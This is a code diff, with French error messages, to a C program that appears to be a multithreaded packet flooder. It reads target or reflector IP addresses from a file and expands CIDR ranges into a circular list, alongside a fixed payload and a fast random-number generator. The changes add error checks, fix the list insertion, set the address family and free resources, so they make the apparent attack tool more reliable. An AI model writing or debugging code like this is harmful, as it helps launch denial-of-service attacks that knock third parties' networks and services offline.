@@ -17,6 +17,7 @@ static const char PAYLOAD[] =
 
 #define MAX_PACKET_SIZE 4096
 #define PHI 0xaaf219b9
+#define MAXTTL 64
 static uint32_t Q[4096], c = 362436;
 static unsigned int PAYLOADSIZE = sizeof(PAYLOAD) - 1;
 
@@ -141,12 +142,27 @@ void generate_ip_range(struct list **head, const char *range) {
     end.s_addr = start.s_addr | ~((1 << (32 - atoi(strrchr(range, '/') + 1))) - 1);
     for (start.s_addr++; start.s_addr <= end.s_addr; start.s_addr++) {
         struct list *new_node = (struct list *)malloc(sizeof(struct list));
+        if (new_node == NULL) {
+            fprintf(stderr, "Erreur: malloc failed\n");
+            exit(-1);
+        }
         memset(new_node, 0x00, sizeof(struct list));
         new_node->data.sin_addr.s_addr = start.s_addr;
-        new_node->prev = *head;
-        new_node->next = (*head)->next;
-        (*head)->next = new_node;
-        *head = new_node;
+        new_node->data.sin_family = AF_INET;
+        
+        if (*head == NULL) {
+            // Premier nœud
+            new_node->next = new_node;
+            new_node->prev = new_node;
+            *head = new_node;
+        } else {
+            // Insérer dans la liste circulaire
+            new_node->prev = *head;
+            new_node->next = (*head)->next;
+            (*head)->next->prev = new_node;
+            (*head)->next = new_node;
+            *head = new_node;
+        }
     }
 }
 
@@ -170,6 +186,10 @@ int main(int argc, char *argv[]) {
   pps = 0;
   int multiplier = 20;
   FILE *list_fd = fopen(argv[3], "r");
+  if (list_fd == NULL) {
+    fprintf(stderr, "Erreur: Impossible d'ouvrir le fichier %s\n", argv[3]);
+    exit(-1);
+  }
   while (fgets(buffer, max_len, list_fd) != NULL) {
     if ((buffer[strlen(buffer) - 1] == '\n') ||
         (buffer[strlen(buffer) - 1] == '\r')) {
@@ -180,6 +200,14 @@ int main(int argc, char *argv[]) {
       continue;
     }
   }
+  fclose(list_fd);
+  free(buffer);
+  
+  if (head == NULL) {
+    fprintf(stderr, "Erreur: Aucune adresse IP valide trouvée dans le fichier\n");
+    exit(-1);
+  }
+  
   struct list *current = head->next;
   pthread_t thread[num_threads];
   struct sockaddr_in sin;
@@ -213,4 +241,3 @@ int main(int argc, char *argv[]) {
   }
   return 0;
 }
-
